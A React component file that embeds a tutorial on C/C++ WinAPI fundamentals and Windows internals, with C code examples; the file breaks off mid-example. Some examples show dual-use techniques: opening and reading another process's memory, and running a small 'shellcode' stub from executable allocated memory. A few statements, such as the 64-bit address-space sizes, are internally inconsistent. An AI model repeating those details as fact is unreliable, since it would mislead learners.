import { Card } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { BookOpen } from "lucide-react";

interface LessonViewerProps {
  moduleId: string;
}

const LessonViewer = ({ moduleId }: LessonViewerProps) => {
  const lessons: Record<string, any> = {
    fundamentals: {
      title: "C/C++ WinAPI Fundamentals - Deep Dive",
      sections: [
        {
          title: "1. Windows Data Types - Why They Exist",
          content: `Microsoft created Windows-specific data types to ensure portability across different architectures (16-bit, 32-bit, 64-bit). Instead of using 'int' which might be different sizes, DWORD is ALWAYS 32 bits.

UNDERSTANDING THE NAMING:
• 'H' prefix = Handle (HMODULE, HINSTANCE)
• 'LP' prefix = Long Pointer (legacy from 16-bit Windows)
• 'P' prefix = Pointer (PVOID = void*)
• 'DW' prefix = Double Word (32-bit)
• 'Q' prefix = Quad Word (64-bit)

These types are defined in windef.h (included by windows.h). Every Windows program uses them, and understanding them is absolutely fundamental.`,
          code: `// COMPLETE TYPE REFERENCE
// ======================

// Fixed-size integers
BYTE      // 8-bit unsigned (0-255)
WORD      // 16-bit unsigned (0-65,535)
DWORD     // 32-bit unsigned (0-4,294,967,295)
QWORD     // 64-bit unsigned
LONG      // 32-bit signed
LONGLONG  // 64-bit signed

// Architecture-dependent (changes on x86 vs x64)
UINT_PTR  // Unsigned integer, pointer-sized
SIZE_T    // Size type (used for memory sizes)
ULONG_PTR // Unsigned long, pointer-sized
DWORD_PTR // DWORD, pointer-sized

// Booleans - CAREFUL!
BOOL      // 32-bit: TRUE(1) or FALSE(0)
          // WARNING: Can be ANY non-zero for TRUE
BOOLEAN   // 8-bit: TRUE or FALSE

// Pointers
PVOID     // void*
LPVOID    // void* (same as PVOID)
LPCVOID   // const void*

// String pointers
LPSTR     // char* (ANSI string)
LPCSTR    // const char* (const ANSI)
LPWSTR    // wchar_t* (Wide string)
LPCWSTR   // const wchar_t* (const Wide)

// Handles (opaque references)
HANDLE    // Generic handle
HMODULE   // Loaded module/DLL
HWND      // Window handle
HKEY      // Registry key
HDC       // Device context

// REAL-WORLD EXAMPLE
int main() {
    // Process operations
    DWORD dwPid = 1234;
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, dwPid);
    
    // Memory operations
    LPVOID lpAddr = (LPVOID)0x00400000;
    SIZE_T dwSize = 0x1000;  // 4KB
    
    // String operations
    LPCWSTR szFile = L"C:\\\\test.txt";
    
    // Boolean checks
    BOOL bSuccess = ReadProcessMemory(
        hProcess, lpAddr, buffer, 
        dwSize, NULL);
    
    if (bSuccess) {
        wprintf(L"Read succeeded!\\n");
    }
    
    return 0;
}`,
          language: "c"
        },
        {
          title: "2. Handles - The Windows Security Model",
          content: `A HANDLE is Windows' way of giving you controlled access to kernel objects. You DON'T get direct pointers to kernel memory (that would be a security disaster). Instead, you get a handle - essentially a token that says "you're allowed to use this resource."

DEEP TECHNICAL DETAIL:
• Handles are indices into a per-process handle table
• Each process has its own handle table in kernel space
• When you call OpenProcess(1234), the kernel creates an entry and returns the index
• Same handle value in different processes = different objects!
• Handles are validated on every API call by the kernel

This is why you can't just use a handle from another process - it's meaningless outside your handle table.`,
          code: `// COMPLETE HANDLE LIFECYCLE
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD dwPid = 1234;
    
    // STEP 1: OPEN/CREATE
    // Get handle with specific permissions
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE,  // Don't inherit
        dwPid
    );
    
    if (hProcess == NULL) {
        DWORD err = GetLastError();
        wprintf(L"Failed: %lu\\n", err);
        // Common errors:
        // ERROR_ACCESS_DENIED (5)
        // ERROR_INVALID_PARAMETER (87)
        return 1;
    }
    
    // STEP 2: USE
    BYTE buffer[256];
    SIZE_T bytesRead;
    BOOL success = ReadProcessMemory(
        hProcess,
        (LPVOID)0x00400000,
        buffer,
        sizeof(buffer),
        &bytesRead
    );
    
    // STEP 3: CLOSE (ALWAYS!)
    CloseHandle(hProcess);
    // After this, hProcess is INVALID
    // Using it = crash or undefined behavior
    
    return 0;
}

// HANDLE TYPES EXAMPLE
void HandleTypesExample() {
    // File handle
    HANDLE hFile = CreateFileW(
        L"test.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    // Process handle
    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        1234
    );
    
    // Thread handle
    HANDLE hThread = CreateThread(
        NULL, 0,
        ThreadProc, NULL,
        0, NULL
    );
    
    // Event handle
    HANDLE hEvent = CreateEventW(
        NULL, TRUE, FALSE, NULL
    );
    
    // ALL must be closed!
    CloseHandle(hFile);
    CloseHandle(hProc);
    CloseHandle(hThread);
    CloseHandle(hEvent);
}`,
          language: "c"
        },
        {
          title: "3. Error Handling - GetLastError Pattern",
          content: `Windows APIs don't throw exceptions (this is C, not C++!). Instead, they return success/failure indicators and set a thread-local error code you retrieve with GetLastError().

CRITICAL PATTERN:
1. Call Windows API
2. Check return value (NULL, FALSE, -1, etc.)
3. If failed, call GetLastError() IMMEDIATELY
4. Any other Windows API call might overwrite the error!

ERROR CODE RANGES:
• 0-15999: Windows system errors
• 16000+: Application-defined errors

Common errors you WILL encounter:
• ERROR_ACCESS_DENIED (5): Insufficient permissions
• ERROR_INVALID_HANDLE (6): Handle is closed/invalid  
• ERROR_NOT_ENOUGH_MEMORY (8): Memory allocation failed
• ERROR_INVALID_PARAMETER (87): Bad parameter`,
          code: `#include <windows.h>
#include <stdio.h>

// CORRECT error handling
void CorrectErrorHandling() {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        1234
    );
    
    if (hProcess == NULL) {
        DWORD dwError = GetLastError();
        
        wprintf(L"OpenProcess failed: %lu\\n", 
                dwError);
        
        // Translate error to human-readable
        LPWSTR pMessage = NULL;
        FormatMessageW(
            FORMAT_MESSAGE_ALLOCATE_BUFFER |
            FORMAT_MESSAGE_FROM_SYSTEM,
            NULL,
            dwError,
            0,
            (LPWSTR)&pMessage,
            0,
            NULL
        );
        
        if (pMessage) {
            wprintf(L"Error: %s\\n", pMessage);
            LocalFree(pMessage);
        }
        
        return;
    }
    
    // Use handle...
    CloseHandle(hProcess);
}

// WRONG - Don't do this!
void WrongErrorHandling() {
    HANDLE h = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, 1234);
    
    // WRONG: Called another API before GetLastError
    Sleep(10);  // This might change error code!
    
    DWORD err = GetLastError();  // WRONG
    wprintf(L"Error: %lu\\n", err);
}

// Helper function for error reporting
void ReportError(const wchar_t* context) {
    DWORD err = GetLastError();
    LPWSTR pMsg = NULL;
    
    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, err, 0,
        (LPWSTR)&pMsg, 0, NULL
    );
    
    wprintf(L"[!] %s failed: %lu - %s\\n",
            context, err, pMsg ? pMsg : L"Unknown");
    
    if (pMsg) LocalFree(pMsg);
}

// Usage
int main() {
    HANDLE h = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, 99999);
    
    if (h == NULL) {
        ReportError(L"OpenProcess");
        return 1;
    }
    
    CloseHandle(h);
    return 0;
}`,
          language: "c"
        },
        {
          title: "4. Unicode vs ANSI - The String Problem",
          content: `Windows has TWO versions of most string APIs: ANSI (A suffix) and Unicode (W suffix). The generic version (no suffix) is a macro that picks one based on UNICODE being defined.

WHY THIS EXISTS:
• Windows started with ANSI (8-bit chars)
• Switched to Unicode (16-bit wchar_t)  
• Kept both for compatibility

MODERN RULE: ALWAYS use Unicode (W versions)!
• Modern Windows is Unicode internally
• ANSI versions convert to Unicode anyway (performance hit)
• Some APIs are Unicode-only (e.g., named pipes)
• International characters work properly

STRING LITERALS:
• "text" = char* (ANSI)
• L"text" = wchar_t* (Unicode)
• TEXT("text") = Picks based on UNICODE macro`,
          code: `#include <windows.h>
#include <stdio.h>

int main() {
    // ANSI version (DON'T USE)
    HANDLE hFileA = CreateFileA(
        "test.txt",  // char*
        GENERIC_READ,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );
    
    // Unicode version (CORRECT)
    HANDLE hFileW = CreateFileW(
        L"test.txt",  // wchar_t*
        GENERIC_READ,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );
    
    // Generic (depends on UNICODE macro)
    // In most modern code, this = CreateFileW
    HANDLE hFile = CreateFile(
        TEXT("test.txt"),  // TCHAR*
        GENERIC_READ,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );
    
    // String conversion if needed
    char ansiStr[] = "Hello";
    wchar_t wideStr[256];
    
    // Convert ANSI -> Unicode
    MultiByteToWideChar(
        CP_UTF8,  // Input codepage
        0,        // Flags
        ansiStr,  // Input
        -1,       // Null-terminated
        wideStr,  // Output
        256       // Output size
    );
    
    wprintf(L"Converted: %s\\n", wideStr);
    
    CloseHandle(hFileA);
    CloseHandle(hFileW);
    CloseHandle(hFile);
    
    return 0;
}

// Best practice: Use wide strings everywhere
void BestPractice() {
    // All wide strings
    const wchar_t* szPath = L"C:\\\\test.txt";
    wchar_t szBuffer[MAX_PATH];
    
    wcscpy_s(szBuffer, MAX_PATH, szPath);
    wprintf(L"Path: %s\\n", szBuffer);
    
    // Use W versions explicitly
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(
        L"C:\\\\*.txt", &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            wprintf(L"Found: %s\\n", 
                    findData.cFileName);
        } while (FindNextFileW(hFind, &findData));
        
        FindClose(hFind);
    }
}`,
          language: "c"
        },
        {
          title: "5. Essential Header Files",
          content: `Windows programming uses many header files. Understanding what each provides is crucial for efficient development.

CORE HEADERS:
• windows.h - Master header, includes most others
• winnt.h - Windows NT definitions (structures, types)
• winbase.h - Base APIs (process, thread, file, memory)
• windef.h - Basic type definitions
• winuser.h - User interface APIs

ADVANCED HEADERS:
• tlhelp32.h - ToolHelp functions (snapshot APIs)
• psapi.h - Process Status API (memory info)
• winternl.h - Internal NT structures (undocumented!)
• ntstatus.h - NTSTATUS codes

SPECIAL HEADERS:
• winsock2.h - Network programming (include BEFORE windows.h!)
• d3d11.h - Direct3D graphics
• winreg.h - Registry operations

PRO TIP: windows.h is huge (100,000+ lines expanded). You can speed compilation by defining macros to exclude parts you don't need.`,
          code: `// MINIMAL INCLUDES
#define WIN32_LEAN_AND_MEAN  // Exclude rarely-used
#define NOMINMAX             // No min/max macros
#include <windows.h>

// SPECIFIC FUNCTIONALITY
#include <windows.h>    // Core
#include <tlhelp32.h>   // Process snapshots
#include <psapi.h>      // Process APIs

// Link required libraries
#pragma comment(lib, "psapi.lib")

// INCLUDE ORDER MATTERS!
// WRONG:
// #include <windows.h>
// #include <winsock2.h>  // Error: redefinition

// CORRECT:
#include <winsock2.h>   // First!
#include <windows.h>    // Second

// CONDITIONAL COMPILATION
#ifdef _DEBUG
    #define LOG(msg) wprintf(L"[DEBUG] %s\\n", msg)
#else
    #define LOG(msg)  // No-op in release
#endif

// USEFUL MACROS
#define ARRAY_SIZE(arr) \\
    (sizeof(arr) / sizeof((arr)[0]))

#define SAFE_CLOSE(h) \\
    if (h != NULL && h != INVALID_HANDLE_VALUE) { \\
        CloseHandle(h); \\
        h = NULL; \\
    }

// Example usage
int main() {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        1234
    );
    
    if (hProcess == NULL) {
        LOG(L"OpenProcess failed");
        return 1;
    }
    
    LOG(L"OpenProcess succeeded");
    
    // Do work...
    
    SAFE_CLOSE(hProcess);
    return 0;
}

// HEADER GUARD EXAMPLE
// In your own headers:
#ifndef MY_HEADER_H
#define MY_HEADER_H

#include <windows.h>

// Your declarations...

#endif // MY_HEADER_H`,
          language: "c"
        }
      ]
    },
    "windows-internals": {
      title: "Windows Internals & Win32 API",
      sections: [
        {
          title: "1. Process Architecture - How Programs Really Run",
          content: `A Windows process is NOT just a running program. It's a container that holds:
• Virtual address space (memory sandbox)
• Executable code (.exe loaded into memory)
• Handle table (references to kernel objects)
• Security context (access token)
• Thread(s) that actually execute code

KEY INSIGHT: The process doesn't execute anything. Threads execute code. The process is just the environment.

PROCESS CREATION FLOW:
1. Windows loads PE file into memory
2. Creates process object in kernel
3. Creates primary thread
4. Thread starts at entry point
5. Process "runs" (really, its thread runs)

IMPORTANT COMPONENTS:
• PEB (Process Environment Block): User-mode process info
• Process Handle Table: Maps handles to kernel objects
• VAD Tree: Tracks virtual memory allocations
• Primary Token: Security identity`,
          code: `#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// EXAMPLE 1: Process creation
void CreateProcessExample() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create notepad process
    BOOL success = CreateProcessW(
        L"C:\\\\Windows\\\\notepad.exe",  // Program
        NULL,                           // Command line
        NULL,                           // Process security
        NULL,                           // Thread security
        FALSE,                          // Inherit handles
        0,                              // Creation flags
        NULL,                           // Environment
        NULL,                           // Working directory
        &si,                            // Startup info
        &pi                             // Process info OUT
    );
    
    if (success) {
        wprintf(L"Created PID: %lu\\n", pi.dwProcessId);
        wprintf(L"Process Handle: %p\\n", pi.hProcess);
        wprintf(L"Thread Handle: %p\\n", pi.hThread);
        
        // Wait for process to initialize
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        // Get exit code
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        wprintf(L"Exit code: %lu\\n", exitCode);
        
        // Cleanup
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// EXAMPLE 2: Enumerate all processes
void EnumerateProcesses() {
    // Create snapshot of all processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,
        0  // All processes
    );
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"Snapshot failed\\n");
        return;
    }
    
    PROCESSENTRY32W pe = { sizeof(pe) };
    
    // Get first process
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            wprintf(L"PID: %5lu | %s\\n",
                    pe.th32ProcessID,
                    pe.szExeFile);
        } while (Process32NextW(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
}

// EXAMPLE 3: Get process information
void GetProcessInfo(DWORD pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_READ,
        FALSE,
        pid
    );
    
    if (hProcess == NULL) {
        wprintf(L"Cannot open PID %lu\\n", pid);
        return;
    }
    
    // Get full image path
    wchar_t szPath[MAX_PATH];
    DWORD dwSize = MAX_PATH;
    
    if (QueryFullProcessImageNameW(
            hProcess, 0, szPath, &dwSize)) {
        wprintf(L"Path: %s\\n", szPath);
    }
    
    // Get process times
    FILETIME ftCreate, ftExit, ftKernel, ftUser;
    if (GetProcessTimes(hProcess, 
            &ftCreate, &ftExit, &ftKernel, &ftUser)) {
        
        SYSTEMTIME stCreate;
        FileTimeToSystemTime(&ftCreate, &stCreate);
        
        wprintf(L"Created: %02d:%02d:%02d\\n",
                stCreate.wHour,
                stCreate.wMinute,
                stCreate.wSecond);
    }
    
    CloseHandle(hProcess);
}`,
          language: "c"
        },
        {
          title: "2. Virtual Memory - The 4GB Illusion",
          content: `Every 32-bit process thinks it has 4GB of memory (0x00000000 to 0xFFFFFFFF). This is virtual address space - NOT physical RAM!

MEMORY LAYOUT (32-bit):
0x00000000-0x0000FFFF: Null pointer protection (inaccessible)
0x00010000-0x7FFEFFFF: User mode (process private)
0x7FFF0000-0x7FFFFFFF: User/kernel shared data
0x80000000-0xFFFFFFFF: Kernel mode (privileged)

64-BIT CHANGES:
• 16TB+ address space (0x0000000000000000 to 0x00007FFFFFFFFFFF)
• Lower 128TB is user space
• Upper addresses are kernel
• More address space than you'll ever need

MEMORY TYPES:
• Private: Only your process
• Mapped: Shared with other processes (DLLs, shared memory)
• Reserved: Address space claimed but no RAM committed
• Committed: Actually backed by physical RAM/pagefile

PAGE PROTECTION:
• PAGE_NOACCESS: Touch = crash
• PAGE_READONLY: Read only
• PAGE_READWRITE: Read/write
• PAGE_EXECUTE: Execute code
• PAGE_EXECUTE_READWRITE: RWX (dangerous, DEP blocks this)`,
          code: `#include <windows.h>
#include <stdio.h>

// EXAMPLE 1: Allocate virtual memory
void VirtualMemoryExample() {
    // Reserve and commit 1MB
    SIZE_T dwSize = 1024 * 1024;  // 1MB
    
    LPVOID pMemory = VirtualAlloc(
        NULL,                      // Let Windows choose address
        dwSize,                    // Size
        MEM_COMMIT | MEM_RESERVE,  // Reserve + commit
        PAGE_READWRITE             // Protection
    );
    
    if (pMemory == NULL) {
        wprintf(L"VirtualAlloc failed\\n");
        return;
    }
    
    wprintf(L"Allocated at: %p\\n", pMemory);
    
    // Use memory
    memset(pMemory, 0x41, dwSize);
    wprintf(L"Filled with 0x41\\n");
    
    // Query memory info
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(pMemory, &mbi, sizeof(mbi));
    
    wprintf(L"Base: %p\\n", mbi.BaseAddress);
    wprintf(L"Size: %zu\\n", mbi.RegionSize);
    wprintf(L"State: %lx\\n", mbi.State);
    wprintf(L"Protect: %lx\\n", mbi.Protect);
    
    // Free memory
    VirtualFree(pMemory, 0, MEM_RELEASE);
}

// EXAMPLE 2: Change memory protection
void ChangeProtectionExample() {
    LPVOID pMem = VirtualAlloc(
        NULL, 4096,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    // Write some code (shellcode)
    BYTE code[] = {
        0xC3  // ret instruction
    };
    memcpy(pMem, code, sizeof(code));
    
    // Change to executable
    DWORD oldProtect;
    BOOL success = VirtualProtect(
        pMem,               // Address
        4096,               // Size
        PAGE_EXECUTE_READ,  // New protection
        &oldProtect         // Old protection OUT
    );
    
    if (success) {
        wprintf(L"Changed protection\\n");
        wprintf(L"Old: %lx, New: PAGE_EXECUTE_READ\\n",
                oldProtect);
        
        // Execute code
        ((void(*)())pMem)();
        wprintf(L"Code executed!\\n");
    }
    
    VirtualFree(pMem, 0, MEM_RELEASE);
}

// EXAMPLE 3: Walk process memory
void WalkMemory() {
    LPVOID pAddress = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    
    wprintf(L"Address           Size      State     Protect\\n");
    wprintf(L"================================================\\n");
    
    while (VirtualQuery(pAddress, &mbi, sizeof(mbi))) {
        wprintf(L"%016p  %8zu  ",
                mbi.BaseAddress,
                mbi.RegionSize);
        
        // Print state
        if (mbi.State == MEM_COMMIT)
            wprintf(L"COMMIT  ");
        else if (mbi.State == MEM_RESERVE)
            wprintf(L"RESERVE ");
        else
            wprintf(L"FREE    ");
        
        // Print protection
        switch (mbi.Protect) {
            case PAGE_NOACCESS:
                wprintf(L"---\\n");
                break;
            case PAGE_READONLY:
                wprintf(L"R--\\n");
                break;
            case PAGE_READWRITE:
                wprintf(L"RW-\\n");
                break;
            case PAGE_EXECUTE:
                wprintf(L"--X\\n");
                break;
            case PAGE_EXECUTE_READ:
                wprintf(L"R-X\\n");
                break;
            case PAGE_EXECUTE_READWRITE:
                wprintf(L"RWX\\n");
                break;
            default:
                wprintf(L"???\\n");
        }
        
        // Move to next region
        pAddress = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
    }
}

// EXAMPLE 4: Read another process memory
void ReadProcessMemoryExample(DWORD pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ,
        FALSE,
        pid
    );
    
    if (hProcess == NULL) return;
    
    // Read from process base (usually 0x400000)
    BYTE buffer[256];
    SIZE_T bytesRead;
    
    BOOL success = ReadProcessMemory(
        hProcess,
        (LPVOID)0x400000,
        buffer,
        sizeof(buffer),
        &bytesRead
    );
    
    if (success) {
        wprintf(L"Read %zu bytes from PID %lu\\n",
                bytesRead, pid);
        
        // Hex dump
        for (SIZE_T i = 0; i < bytesRead; i++) {
            wprintf(L"%02X ", buffer[i]);
            if ((i + 1) % 16 == 0) wprintf(L"\\n");
        }
    }
    
    CloseHandle(hProcess);
}`,
          language: "c"
        },
        {
          title: "3. Thread Management - Concurrent Execution",
          content: `Threads are the execution units in Windows. A process can have 1 to thousands of threads, all sharing the same address space but having separate stacks and execution contexts.

THREAD COMPONENTS:
• Stack: Local variables, function calls (default 1MB)
• TEB (Thread Environment Block): Thread-local storage
• Context: CPU registers (saved during context switches)
• Priority: Scheduler priority level

THREAD STATES:
• Running: Currently executing on CPU
• Ready: Waiting for CPU time
• Waiting: Blocked on object (event, mutex, etc.)
• Terminated: Finished execution

SYNCHRONIZATION PRIMITIVES:
• Critical Section: Fast, user-mode only lock
• Mutex: Can be named, cross-process
• Semaphore: Counting resource lock
• Event: Signal/wait mechanism

THREAD-SAFE PROGRAMMING:
• Use InterlockedXXX for atomic operations
• Protect shared data with locks
• Avoid race conditions
• Deadlock awareness (don't lock in wrong order!)`,
          code: `#include <windows.h>
#include <stdio.h>

// Shared data
volatile LONG g_counter = 0;
CRITICAL_SECTION g_cs;

// Thread function
DWORD WINAPI ThreadProc(LPVOID lpParam) {
    int threadNum = (int)(LONG_PTR)lpParam;
    
    for (int i = 0; i < 10000; i++) {
        // WRONG: Not thread-safe
        // g_counter++;
        
        // CORRECT: Use interlocked
        InterlockedIncrement(&g_counter);
        
        // Or use critical section
        EnterCriticalSection(&g_cs);
        // g_counter++;  // Now safe
        LeaveCriticalSection(&g_cs);
    }
    
    wprintf(L"Thread %d finished\\n", threadNum);
    return 0;
}

// EXAMPLE 1: Create threads
void CreateThreadsExample() {
    InitializeCriticalSection(&g_cs);
    
    const int NUM_THREADS = 4;
    HANDLE hThreads[NUM_THREADS];
    
    // Create threads
    for (int i = 0; i < NUM_THREADS; i++) {
        hThreads[i] = CreateThread(
            NULL,                    // Security
            0,                       // Stack size (default)
            ThreadProc,              // Function
            (LPVOID)(LONG_PTR)i,    // Parameter
            0,                       // Flags
            NULL                     // Thread ID OUT (optional)
        );
        
        if (hThreads[i] == NULL) {
            wprintf(L"Failed to create thread %d\\n", i);
        }
    }
    
    // Wait for all threads
    WaitForMultipleObjects(
        NUM_THREADS,
        hThreads,
        TRUE,      // Wait for all
        INFINITE   // No timeout
    );
    
    wprintf(L"Final counter: %ld\\n", g_counter);
    
    // Cleanup
    for (int i = 0; i < NUM_THREADS; i++) {
        CloseHandle(hThreads[i]);
    }
    
    DeleteCriticalSection(&g_cs);
}

// EXAMPLE 2: Thread synchronization with events
HANDLE g_hEvent;

DWORD WINAPI WaitingThread(LPVOID lpParam) {
    wprintf(L"Waiting thread: Waiting for signal...\\n");
    
    // Wait for event
    DWORD result = WaitForSingleObject(
        g_hEvent,
        INFINITE  // Wait forever
    );
    
    if (result == WAIT_OBJECT_0) {
        wprintf(L"Waiting thread: Received signal!\\n");
    }
    
    return 0;
}

void EventExample() {
    // Create manual-reset event (stays signaled)
    g_hEvent = CreateEventW(
        NULL,   // Security
        TRUE,   // Manual reset
        FALSE,  // Initial state (non-signaled)
        NULL    // Name
    );
    
    // Create waiting thread
    HANDLE hThread = CreateThread(
        NULL, 0, WaitingThread, NULL, 0, NULL);
    
    // Main thread sleeps
    Sleep(2000);
    
    // Signal the event
    wprintf(L"Main thread: Signaling event...\\n");
    SetEvent(g_hEvent);
    
    // Wait for thread to finish
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    CloseHandle(g_hEvent);
}

// EXAMPLE 3: Get thread information
void GetThreadInfo() {
    DWORD currentTid = GetCurrentThreadId();
    HANDLE hThread = GetCurrentThread();
    
    wprintf(L"Thread ID: %lu\\n", currentTid);
    
    // Get priority
    int priority = GetThreadPriority(hThread);
    wprintf(L"Priority: %d\\n", priority);
    
    // Get CPU usage times
    FILETIME ftCreate, ftExit, ftKernel, ftUser;
    if (GetThreadTimes(hThread,
            &ftCreate, &ftExit, &ftKernel, &ftUser)) {
        
        ULARGE_INTEGER kernel, user;
        kernel.LowPart = ftKernel.dwLowDateTime;
        kernel.HighPart = ftKernel.dwHighDateTime;
        user.LowPart = ftUser.dwLowDateTime;
        user.HighPart = ftUser.dwHighDateTime;
        
        wprintf(L"Kernel time: %llu\\n", kernel.QuadPart);
        wprintf(L"User time: %llu\\n", user.QuadPart);
    }
}

// EXAMPLE 4: Thread pool
void ThreadPoolExample() {
    // Use Windows thread pool
    PTP_WORK work = CreateThreadpoolWork(
        [](PTP_CALLBACK_INSTANCE, PVOID ctx, PTP_WORK) {
            int num = (int)(LONG_PTR)ctx;
            wprintf(L"Worker %d executing\\n", num);
            Sleep(1000);
        },
        (PVOID)(LONG_PTR)1,
        NULL
    );
    
    // Submit work
    SubmitThreadpoolWork(work);
    
    // Wait for completion
    WaitForThreadpoolWorkCallbacks(work, FALSE);
    
    CloseThreadpoolWork(work);
}`,
          language: "c"
        },
        {
          title: "4. Win32 API Deep Dive - Most Important Functions",
          content: `The Win32 API contains thousands of functions. You don't need to know them all, but understanding these categories is essential:

PROCESS/THREAD:
• CreateProcess - Start new process
• OpenProcess - Get handle to existing process
• CreateThread - Create new thread
• TerminateProcess - Kill process

MEMORY:
• VirtualAlloc - Allocate virtual memory
• VirtualFree - Free virtual memory
• VirtualProtect - Change memory protection
• ReadProcessMemory - Read another process
• WriteProcessMemory - Write to another process

FILE I/O:
• CreateFile - Open/create file
• ReadFile - Read from file
• WriteFile - Write to file
• SetFilePointer - Seek in file
• GetFileSizeEx - Get file size

REGISTRY:
• RegOpenKeyEx - Open registry key
• RegQueryValueEx - Read value
• RegSetValueEx - Write value
• RegCloseKey - Close key

DYNAMIC LOADING:
• LoadLibrary - Load DLL
• GetProcAddress - Find function in DLL
• FreeLibrary - Unload DLL`,
          code: `#include <windows.h>
#include <stdio.h>

// EXAMPLE 1: File operations
void FileOperations() {
    // Create/open file
    HANDLE hFile = CreateFileW(
        L"test.dat",
        GENERIC_WRITE,           // Access
        0,                       // Share mode
        NULL,                    // Security
        CREATE_ALWAYS,           // Always create new
        FILE_ATTRIBUTE_NORMAL,   // Attributes
        NULL                     // Template
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"CreateFile failed: %lu\\n", 
                GetLastError());
        return;
    }
    
    // Write data
    const char data[] = "Hello, Windows!";
    DWORD bytesWritten;
    
    BOOL success = WriteFile(
        hFile,
        data,
        (DWORD)strlen(data),
        &bytesWritten,
        NULL  // Not overlapped
    );
    
    if (success) {
        wprintf(L"Wrote %lu bytes\\n", bytesWritten);
    }
    
    // Get file size
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    wprintf(L"File size: %lld bytes\\n", 
            fileSize.QuadPart);
    
    CloseHandle(hFile);
    
    // Read file
    hFile = CreateFileW(
        L"test.dat",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile != INVALID_HANDLE_VALUE) {
        char buffer[256];
        DWORD bytesRead;
        
        ReadFile(hFile, buffer, 255, &bytesRead, NULL);
        buffer[bytesRead] = 0;  // Null terminate
        
        printf("Read: %s\\n", buffer);
        CloseHandle(hFile);
    }
}

// EXAMPLE 2: Dynamic library loading
void DynamicLoadingExample() {
    // Load a DLL
    HMODULE hModule = LoadLibraryW(L"user32.dll");
    
    if (hModule == NULL) {
        wprintf(L"LoadLibrary failed\\n");
        return;
    }
    
    // Get function address
    typedef int (WINAPI* MessageBoxW_t)(
        HWND, LPCWSTR, LPCWSTR, UINT);
    
    MessageBoxW_t pMessageBox = 
        (MessageBoxW_t)GetProcAddress(
            hModule, "MessageBoxW");
    
    if (pMessageBox != NULL) {
        wprintf(L"MessageBoxW at: %p\\n", pMessageBox);
        
        // Call it
        pMessageBox(NULL,
                   L"Dynamically loaded!",
                   L"Success",
                   MB_OK);
    }
    
    // Unload
    FreeLibrary(hModule);
}

// EXAMPLE 3: Registry operations
void RegistryExample() {
    HKEY hKey;
    LONG result;
    
    // Open key
    result = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\\\Microsoft\\\\Windows",
        0,                    // Reserved
        KEY_READ,             // Access
        &hKey
    );
    
    if (result != ERROR_SUCCESS) {
        wprintf(L"RegOpenKeyEx failed: %ld\\n", result);
        return;
    }
    
    // Query value
    DWORD dwType;
    BYTE buffer[1024];
    DWORD dwSize = sizeof(buffer);
    
    result = RegQueryValueExW(
        hKey,
        L"SomeValue",        // Value name
        NULL,                // Reserved
        &dwType,             // Type OUT
        buffer,              // Data OUT
        &dwSize              // Size IN/OUT
    );
    
    if (result == ERROR_SUCCESS) {
        if (dwType == REG_SZ) {
            wprintf(L"String value: %s\\n", 
                    (wchar_t*)buffer);
        } else if (dwType == REG_DWORD) {
            wprintf(L"DWORD value: %lu\\n", 
                    *(DWORD*)buffer);
        }
    }
    
    RegCloseKey(hKey);
}

// EXAMPLE 4: Enumerate processes
void EnumerateProcessDetails() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32W pe = { sizeof(pe) };
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            // Open process for query
            HANDLE hProc = OpenProcess(
                PROCESS_QUERY_INFORMATION |
                PROCESS_VM_READ,
                FALSE,
                pe.th32ProcessID
            );
            
            if (hProc != NULL) {
                wchar_t szPath[MAX_PATH];
                DWORD dwSize = MAX_PATH;
                
                if (QueryFullProcessImageNameW(
